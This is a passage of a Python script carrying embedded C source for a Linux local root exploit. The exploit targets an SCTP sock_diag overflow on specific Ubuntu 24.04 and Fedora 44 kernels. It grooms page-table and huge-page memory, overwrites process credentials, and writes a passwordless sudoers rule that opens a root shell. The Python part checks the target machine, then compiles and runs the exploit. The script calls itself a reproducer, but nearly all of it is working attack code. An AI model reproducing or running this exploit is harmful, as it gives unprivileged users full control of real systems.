			for (unsigned int entry = 1;
			     entry < PAGE_TABLE_ENTRIES && remaining;
			     entry++) {
				if (entry % ENTRIES_PER_PEER >=
					    CONTROLLED_ENTRY_FIRST &&
				    entry % ENTRIES_PER_PEER <=
					    CONTROLLED_ENTRY_LAST)
					continue;
				read_zero_page(chunk_base +
					       (size_t)entry * HUGE_BYTES);
				remaining--;
			}
		}
	}
	current_vm_pte_kib = read_vm_pte_kib();
	*reserved_vm_pte_kib = current_vm_pte_kib - baseline_vm_pte_kib;
	if (remaining || current_vm_pte_kib < baseline_vm_pte_kib ||
	    *reserved_vm_pte_kib <
		(long)(PAGE_TABLE_PAGES - 4096U) * 4L ||
	    *reserved_vm_pte_kib >
		(long)(PAGE_TABLE_PAGES + 4096U) * 4L)
		return -1;
	return 0;
}

static void placement_failure(const char *step, int exit_code)
{
	int saved_errno = errno;

	dprintf(STDERR_FILENO, "memory placement failed while %s: "
		"errno %d (%s)\n", step, saved_errno, strerror(saved_errno));
	_exit(exit_code);
}

static void placement_holder_child(int command_fd, int status_fd,
				   struct shared_control *control)
{
	struct huge_page_saturation saturation;
	struct diag_request fd_message;
	struct scanner_argument scanner_argument;
	unsigned char *regions[ADDRESS_REGION_COUNT] = {0};
	unsigned char *sacrificial_mapping;
	unsigned char *competing_memory;
	unsigned int region_count = 0;
	long baseline_vm_pte_kib;
	long reserved_vm_pte_kib;
	int successor_fds[CORRIDOR_COUNT];
	int page_table_fds[CORRIDOR_COUNT];
	pthread_t scanner;
	char command;

	pin_cpu(0);
	sacrificial_mapping = prepare_sacrificial_mapping();
	if (sacrificial_mapping == MAP_FAILED)
		placement_failure("preparing the adjacent disposable memory", 2);
	competing_memory = prepare_competing_memory();
	if (competing_memory == MAP_FAILED)
		placement_failure("preparing the competing disposable memory", 3);
	for (unsigned int slot = 1; slot + 1U < ADDRESS_REGION_COUNT; slot++) {
		unsigned char *region;

		region = mmap(
			(void *)(uintptr_t)((uint64_t)slot *
					   TOP_LEVEL_REGION_BYTES),
			ADDRESS_REGION_BYTES, PROT_READ | PROT_WRITE,
			MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE |
			MAP_FIXED_NOREPLACE, -1, 0);
		if (region == MAP_FAILED)
			continue;
		if (madvise(region, ADDRESS_REGION_BYTES, MADV_NOHUGEPAGE) < 0)
			placement_failure("preparing an address region", 4);
		regions[slot] = region;
		region_count++;
	}
	if (region_count < MINIMUM_ADDRESS_REGIONS)
		placement_failure("reserving enough address regions", 5);
	printf("page-table address regions prepared: %u\n", region_count);
	scanner_argument = (struct scanner_argument) {
		.regions = regions,
		.control = control,
	};
	if (pthread_create(&scanner, NULL, credential_scanner,
			   &scanner_argument) != 0)
		placement_failure("starting the credential scanner", 6);
	baseline_vm_pte_kib = read_vm_pte_kib();
	if (baseline_vm_pte_kib < 0)
		placement_failure("measuring initial page-table memory", 7);
	if (write(status_fd, "P", 1) != 1)
		_exit(8);
	for (unsigned int corridor = 0; corridor < CORRIDOR_COUNT;
	     corridor++) {
		if (receive_request_fd(command_fd, &fd_message) < 0)
			_exit(9);
		successor_fds[corridor] = fd_message.nl;
		if (receive_request_fd(command_fd, &fd_message) < 0)
			_exit(9);
		page_table_fds[corridor] = fd_message.nl;
		if (successor_fds[corridor] < 0 ||
		    page_table_fds[corridor] < 0)
			_exit(9);
	}
	if (read(command_fd, &command, 1) != 1 || command != 'T')
		_exit(10);
	(void)prctl(PR_SET_NAME, "pt_reservoir", 0, 0, 0);
	if (release_queued_replies(page_table_fds) < 0)
		_exit(11);
	if (build_page_table_reservoir(regions, region_count,
				       baseline_vm_pte_kib,
				       &reserved_vm_pte_kib) < 0 ||
	    write(status_fd, &reserved_vm_pte_kib,
		  sizeof(reserved_vm_pte_kib)) != sizeof(reserved_vm_pte_kib) ||
	    read(command_fd, &command, 1) != 1 || command != 'D')
		_exit(12);
	saturation = saturate_competing_huge_pages(competing_memory);
	if (write(status_fd, &saturation, sizeof(saturation)) !=
	    sizeof(saturation) ||
	    read(command_fd, &command, 1) != 1 || command != 'S')
		_exit(13);
	saturation = fill_sacrificial_mapping(
		sacrificial_mapping, successor_fds);
	if (write(status_fd, &saturation, sizeof(saturation)) !=
	    sizeof(saturation))
		_exit(14);
	if (read(command_fd, &command, 1) != 1 || command != 'R')
		_exit(15);
	if (prctl(PR_SET_PDEATHSIG, 0, 0, 0, 0) < 0)
		for (;;)
			pause();
	(void)prctl(PR_SET_NAME, "diagspill_hold", 0, 0, 0);
	(void)signal(SIGHUP, SIG_IGN);
	(void)signal(SIGINT, SIG_IGN);
	(void)signal(SIGTERM, SIG_IGN);
	(void)setsid();
	if (write(status_fd, "R", 1) != 1)
		for (;;)
			pause();
	close(command_fd);
	close(status_fd);
	{
		int null_fd = open("/dev/null", O_RDWR | O_CLOEXEC);

		if (null_fd >= 0) {
			(void)dup2(null_fd, STDIN_FILENO);
			(void)dup2(null_fd, STDOUT_FILENO);
			(void)dup2(null_fd, STDERR_FILENO);
			if (null_fd > STDERR_FILENO)
				close(null_fd);
		}
	}
	for (;;)
		pause();
}

static struct placement_holder start_placement_holder(
	struct shared_control *control)
{
	struct placement_holder holder = {
		.pid = -1,
		.command_fd = -1,
		.status_fd = -1,
	};
	int command_socket[2];
	int status_pipe[2];

	if (socketpair(AF_UNIX, SOCK_SEQPACKET | SOCK_CLOEXEC,
		       0, command_socket) < 0 ||
	    pipe2(status_pipe, O_CLOEXEC) < 0)
		return holder;
	holder.pid = fork();
	if (holder.pid < 0)
		return holder;
	if (!holder.pid) {
		close(command_socket[0]);
		close(status_pipe[0]);
		(void)prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
		if (getppid() == 1)
			_exit(16);
		placement_holder_child(command_socket[1], status_pipe[1], control);
	}
	close(command_socket[1]);
	close(status_pipe[1]);
	holder.command_fd = command_socket[0];
	holder.status_fd = status_pipe[0];
	return holder;
}

int main(int argc, char **argv)
{
	struct rlimit core = {0, 0};
	struct rlimit files;
	struct shared_control *control;
	struct diag_request request;
	struct reply_wall wall;
	struct placement_holder holder;
	struct huge_page_saturation huge_saturation;
	struct huge_page_saturation sacrificial_saturation;
	struct diagnostic_saturation diagnostic_saturation;
	struct diag_request fd_message = {.nl = -1};
	pid_t network;
	long reserved_vm_pte_kib;
	int network_fd;
	char status;

	setvbuf(stdout, NULL, _IONBF, 0);
	(void)argc;
	(void)unlink(argv[0]);
	pin_cpu(0);
	(void)setrlimit(RLIMIT_CORE, &core);
	if (getrlimit(RLIMIT_NOFILE, &files) == 0) {
		files.rlim_cur = files.rlim_max;
		(void)setrlimit(RLIMIT_NOFILE, &files);
	}
	control = map_control();
	if (control == MAP_FAILED)
		return 1;

	breaker("PREPARING DISPOSABLE MEMORY");
	holder = start_placement_holder(control);
	if (holder.pid < 0 || read(holder.status_fd, &status, 1) != 1 ||
	    status != 'P')
		return 1;

	breaker("ALLOCATING CONTIGUOUS DIAGNOSTIC REPLIES");
	wall = start_reply_wall();
	if (wall.pid < 0)
		return 1;
	for (unsigned int corridor = 0; corridor < CORRIDOR_COUNT;
	     corridor++) {
		if (wall.target_fds[corridor] < 0 ||
		    wall.successor_fds[corridor] < 0 ||
		    wall.page_table_fds[corridor] < 0)
			return 1;
		fd_message.nl = wall.successor_fds[corridor];
		if (send_request_fd(holder.command_fd, &fd_message) < 0)
			return 1;
		fd_message.nl = wall.page_table_fds[corridor];
		if (send_request_fd(holder.command_fd, &fd_message) < 0)
			return 1;
	}
	printf("protected overflow corridors prepared: %u\n",
	       CORRIDOR_COUNT);

	breaker("PREPARING CREDENTIAL TARGETS");
	if (spawn_credential_workers(control) != CREDENTIAL_WORKERS)
		return 1;
	printf("credential worker processes ready: %u\n", CREDENTIAL_WORKERS);

	breaker("PREPARING THE SCTP ASSOCIATION");
	printf("building the large association; this can take several minutes\n");
	network = start_overflow_network(&network_fd);
	if (network < 0 || receive_request_fd(network_fd, &request) < 0)
		return 1;
	printf("overflow association addresses: %u\n", OVERFLOW_PEERS);
	printf("overflow association count after 16-bit truncation: %u\n",
	       OVERFLOW_PEERS & UINT16_MAX);

	breaker("FILLING THE DISPOSABLE PAGE-TABLE RESERVOIR");
	if (write(holder.command_fd, "T", 1) != 1 ||
	    read(holder.status_fd, &reserved_vm_pte_kib,
		 sizeof(reserved_vm_pte_kib)) != sizeof(reserved_vm_pte_kib) ||
	    reserved_vm_pte_kib <= 0)
		return 1;
	printf("page-table memory retained: %ld MiB\n",
	       reserved_vm_pte_kib / 1024L);

	breaker("FILLING COMPETING MEMORY WITH DISPOSABLE HUGE PAGES");
	if (write(holder.command_fd, "D", 1) != 1 ||
	    read(holder.status_fd, &huge_saturation,
		 sizeof(huge_saturation)) != sizeof(huge_saturation)) {
		breaker("MEMORY PLACEMENT STOPPED EARLY");
		printf("the disposable-memory worker did not report a result\n");
		explain_safe_retry();
		return 1;
	}
	if (huge_saturation.attempts == MAX_COMPETING_HUGE_PAGES ||
	    huge_saturation.retained_huge_pages < 2U ||
	    !huge_saturation.allocation_pressure_observed) {
		report_huge_page_placement_failure(
			"reserving competing disposable memory",
			huge_saturation, 2U, MAX_COMPETING_HUGE_PAGES);
		return 1;
	}
	printf("disposable huge pages retained: %u\n",
	       huge_saturation.retained_huge_pages);
	printf("competing huge-page supply exhausted: yes\n");

	breaker("RESERVING EVERY OTHER LARGE DIAGNOSTIC BUFFER");
	if (write(wall.command_fd, "F", 1) != 1 ||
	    read(wall.status_fd, &diagnostic_saturation,
		 sizeof(diagnostic_saturation)) !=
		sizeof(diagnostic_saturation) ||
	    diagnostic_saturation.retained_replies ==
		MAX_DIAGNOSTIC_FILLERS ||
	    diagnostic_saturation.consecutive_failures !=
		DIAGNOSTIC_FAILURE_STREAK)
		return 1;
	printf("additional diagnostic replies retained: %u\n",
	       diagnostic_saturation.retained_replies);
	printf("consecutive diagnostic allocation failures: %u\n",
	       diagnostic_saturation.consecutive_failures);

	breaker("FILLING ADJACENT CORRIDORS WITH DISPOSABLE HUGE PAGES");
	if (write(holder.command_fd, "S", 1) != 1 ||
	    read(holder.status_fd, &sacrificial_saturation,
		 sizeof(sacrificial_saturation)) !=
		 sizeof(sacrificial_saturation)) {
		breaker("MEMORY PLACEMENT STOPPED EARLY");
		printf("the disposable-memory worker did not report a result\n");
		explain_safe_retry();
		return 1;
	}
	if (sacrificial_saturation.attempts ==
		 MAX_SACRIFICIAL_HUGE_PAGES ||
	    sacrificial_saturation.retained_huge_pages <
		2U * CORRIDOR_COUNT ||
	    !sacrificial_saturation.allocation_pressure_observed) {
		report_huge_page_placement_failure(
			"filling the adjacent disposable corridors",
			sacrificial_saturation, 2U * CORRIDOR_COUNT,
			MAX_SACRIFICIAL_HUGE_PAGES);
		return 1;
	}
	printf("disposable two-mebibyte pages retained after corridor release: "
	       "%u\n", sacrificial_saturation.retained_huge_pages);
	printf("remaining competing huge-page supply exhausted: yes\n");

	breaker("TRIGGERING THE SCTP SOCK_DIAG OVERFLOW");
	(void)prctl(PR_SET_NAME, "overflow_alloc", 0, 0, 0);
	if (trigger_diag(&request, wall.target_fds) < 0)
		return 1;
	atomic_store_explicit(&control->scan_start, 1, memory_order_release);
	futex_wake_all(&control->scan_start);
	for (unsigned int wait = 0; wait < 6000U; wait++) {
		if (atomic_load_explicit(&control->winner,
					memory_order_acquire) == 1)
			break;
		usleep(10000);
	}

	breaker("VERIFYING THE ROOT CONVERSION");
	printf("physical-memory windows opened: %d\n",
	       atomic_load_explicit(&control->mapping_hits,
				    memory_order_acquire));
	printf("possibly-credential objects changed: %d\n",
	       atomic_load_explicit(&control->candidates,
				    memory_order_acquire));
	if (atomic_load_explicit(&control->winner, memory_order_acquire) != 1) {
		printf("root conversion was not observed; retaining the "
		       "disposable mappings for inspection\n");
		for (;;)
			pause();
	}
	if (write(holder.command_fd, "R", 1) != 1 ||
	    read(holder.status_fd, &status, 1) != 1 || status != 'R') {
		printf("the disposable-memory holder could not detach; retaining "
		       "the foreground process to avoid unsafe teardown\n");
		for (;;)
			pause();
	}
	close(holder.command_fd);
	close(holder.status_fd);
	printf("root conversion: confirmed\n");
	printf("sacrificial memory remains held by diagspill_hold until reboot\n");
	breaker("OPENING THE ROOT SHELL");
	{
		pid_t shell = fork();
		pid_t waited;
		int shell_status;

		if (shell < 0)
			return 1;
		if (!shell) {
			execl(SUDO_BINARY, SUDO_BINARY, "-n", "/bin/sh", "-p",
			      "-c", "rm -f " SUDOERS_PATH "; exec /bin/sh -p",
			      (char *)NULL);
			perror("could not open the root shell");
			_exit(1);
		}
		(void)signal(SIGHUP, SIG_IGN);
		(void)signal(SIGINT, SIG_IGN);
		(void)signal(SIGTERM, SIG_IGN);
		do {
			waited = waitpid(shell, &shell_status, 0);
		} while (waited < 0 && errno == EINTR);
		if (waited < 0) {
			perror("could not wait for the root shell");
			return 1;
		}
		if (WIFEXITED(shell_status))
			return WEXITSTATUS(shell_status);
		if (WIFSIGNALED(shell_status))
			return 128 + WTERMSIG(shell_status);
		return 1;
	}
}
'''


def breaker(description: str) -> None:
    print(f"\n***{description}***", flush=True)


def read_os_release() -> dict[str, str]:
    values: dict[str, str] = {}
    for line in Path("/etc/os-release").read_text(encoding="utf-8").splitlines():
        if "=" not in line:
            continue
        key, value = line.split("=", 1)
        values[key] = value.strip().strip('"')
    return values


def read_memtotal_kib() -> int:
    for line in Path("/proc/meminfo").read_text(encoding="utf-8").splitlines():
        fields = line.split()
        if len(fields) == 3 and fields[0] == "MemTotal:" and fields[2] == "kB":
            return int(fields[1])
    raise RuntimeError("could not parse MemTotal from /proc/meminfo")


def validate_machine() -> None:
    page_size = int(os.sysconf("SC_PAGE_SIZE"))
    online_cpus = int(os.sysconf("SC_NPROCESSORS_ONLN"))
    memtotal_kib = read_memtotal_kib()

    if page_size != 4096:
        raise RuntimeError(f"unsupported page size {page_size}; expected 4096")
    if online_cpus != 4:
        raise RuntimeError(
            f"unsupported online CPU count {online_cpus}; expected exactly 4"
        )
    if not {0, 1, 2, 3}.issubset(os.sched_getaffinity(0)):
        raise RuntimeError(
            "the process must be allowed to run on logical CPUs 0, 1, 2, and 3"
        )
    if not 3_700_000 <= memtotal_kib <= 4_200_000:
        raise RuntimeError(
            f"unsupported MemTotal {memtotal_kib} kB; expected a 4 GiB machine"
        )


def select_profile() -> TargetProfile:
    values = read_os_release()
    distro = values.get("ID", "")
    version = values.get("VERSION_ID", "")
    release = platform.uname().release

    if platform.machine() != "x86_64":
        raise RuntimeError(
            f"unsupported architecture {platform.machine()!r}; expected x86_64"
        )
    if (
        distro == "ubuntu"
        and version == "24.04"
        and release == "6.17.0-35-generic"
    ):
        profile = TargetProfile(
            "Ubuntu 24.04 / Linux 6.17.0-35-generic", 600_000
        )
    elif (
        distro == "fedora"
        and version == "44"
        and release == "6.19.10-300.fc44.x86_64"
    ):
        profile = TargetProfile(
            "Fedora 44 / Linux 6.19.10-300.fc44.x86_64", 800_000
        )
    else:
        raise RuntimeError(
            "unsupported target; expected Ubuntu 24.04 with Linux "
            "6.17.0-35-generic or Fedora 44 with Linux "
            "6.19.10-300.fc44.x86_64, "
            f"got distribution {distro!r}, version {version!r}, "
            f"and kernel {release!r}"
        )
    validate_machine()
    return profile


def check_baseline() -> bool:
    breaker("CHECKING THE ORDINARY-USER BASELINE")
    identity = subprocess.run(
        [ID_BINARY], check=True, capture_output=True, text=True
    ).stdout.strip()
    print(f"ordinary-user identity: {identity}")
    if ATTACKER_UID == 0:
        print("run this reproducer as an ordinary user")
        return False
    if len(set(os.getresuid())) != 1 or len(set(os.getresgid())) != 1:
        print("real, effective, and saved user and group IDs must match")
        return False
    if os.access("/root", os.R_OK):
        print("root's home was already readable")
        return False
    sudo = subprocess.run(
        [SUDO_BINARY, "-n", "true"],
        check=False,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    if sudo.returncode == 0:
        print("passwordless root was already available before the trigger")
        return False
    print("root access and passwordless sudo are denied as expected")
    return True


def replace_once(source: str, original: str, replacement: str) -> str:
    if source.count(original) != 1:
        raise RuntimeError(
            f"expected one embedded source placeholder, found "
            f"{source.count(original)}: {original!r}"
        )
    return source.replace(original, replacement)


def configured_source() -> str:
    source = EXPLOIT_SOURCE
    source = replace_once(
        source,
        '"attacker ALL=(ALL:ALL) NOPASSWD: ALL\\n"',
        f'"{ATTACKER_USER} ALL=(ALL:ALL) NOPASSWD: ALL\\n"',
    )
    source = replace_once(
        source,
        '#define SUDOERS_PATH "/etc/sudoers.d/diagspill-root-repro"',
        f'#define SUDOERS_PATH "{SUDOERS_PATH}"',
    )
    return source


def build_exploit(profile: TargetProfile) -> None:
    breaker("BUILDING THE STANDALONE EXPLOIT")
    if shutil.which(C_COMPILER) is None:
        raise RuntimeError("a C compiler named 'cc' is required")
    if not os.access(SUDO_BINARY, os.X_OK):
        raise RuntimeError(f"an executable {SUDO_BINARY} is required")
    if not ATTACKER_USER.replace("_", "").replace("-", "").isalnum():
        raise RuntimeError(f"unsupported account name: {ATTACKER_USER!r}")
    EXPLOIT_BINARY.unlink(missing_ok=True)
    C_SOURCE_PATH.write_text(configured_source(), encoding="utf-8")
    try:
        subprocess.run(
            [
                C_COMPILER,
                "-std=gnu11",
                "-O2",
                "-pthread",
                "-Wall",
                "-Wextra",
                "-Werror",
                f"-DCRED_UID={ATTACKER_UID}ULL",
                f"-DCRED_GID={ATTACKER_GID}ULL",
                f"-DPAGE_TABLE_PAGES={profile.page_table_pages}U",
                "-o",
                str(EXPLOIT_BINARY),
                str(C_SOURCE_PATH),
            ],
            check=True,
        )
    except BaseException:
        EXPLOIT_BINARY.unlink(missing_ok=True)
        raise
    finally:
        C_SOURCE_PATH.unlink(missing_ok=True)
    print(f"selected target profile: {profile.name}")
    print("online CPUs used by the exploit: 0, 1, 2, and 3")
    print(
        "disposable page-table memory retained through the trigger: "
        f"{profile.page_table_pages * 4096 // (1024 * 1024)} MiB"
    )


def execute_exploit() -> NoReturn:
    breaker("STARTING THE SCTP SOCK_DIAG ROOT EXPLOIT")
    os.execve(str(EXPLOIT_BINARY), [str(EXPLOIT_BINARY)], os.environ.copy())


def main() -> int:
    try:
        profile = select_profile()
    except RuntimeError as error:
        breaker("UNSUPPORTED TEST MACHINE")
        print(error)
        return 2
    if not check_baseline():
        return 2
    build_exploit(profile)
    execute_exploit()


if __name__ == "__main__":
    raise SystemExit(main())
